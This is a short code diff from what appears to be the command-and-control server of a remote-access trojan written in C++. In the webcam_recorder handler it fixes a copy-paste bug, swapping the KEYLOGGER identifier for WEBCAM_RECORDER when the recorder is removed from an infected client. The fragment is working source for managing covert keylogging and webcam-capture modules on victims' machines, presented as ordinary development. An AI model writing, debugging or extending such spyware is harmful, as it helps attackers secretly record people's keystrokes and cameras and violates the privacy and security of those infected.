@@ -489,13 +489,13 @@ void CommandHandler::keylogger() {
 void CommandHandler::webcam_recorder() {
     int client_index = std::any_cast<int>(arg_map_[INDEX_ARG]);
 
-    Tunnel* p_tunnel = get_tunnel(client_index, KEYLOGGER);
+    Tunnel* p_tunnel = get_tunnel(client_index, WEBCAM_RECORDER);
 
     if (arg_map_.find(REMOVE_ARG) != arg_map_.end()) { // --remove
         if (p_tunnel != nullptr) {
             uint64_t u = 1;
             write(*(p_tunnel->p_tunnel_shutdown_fd_), &u, sizeof(u));
-            send_client(KEYLOGGER, 0, client_index);
+            send_client(WEBCAM_RECORDER, 0, client_index);
             *p_event_log_ << LOG_MUST << GREEN << "[CommandHandler::webcam_recorder] Webcam Recorder removed from client " << client_index << RESET_C2_FIFO;
         } else {
             *p_event_log_ << LOG_MUST << RED << "CommandHandler::webcam_recorder] Webcam Recorder is not active for client " << client_index << RESET_C2_FIFO; 
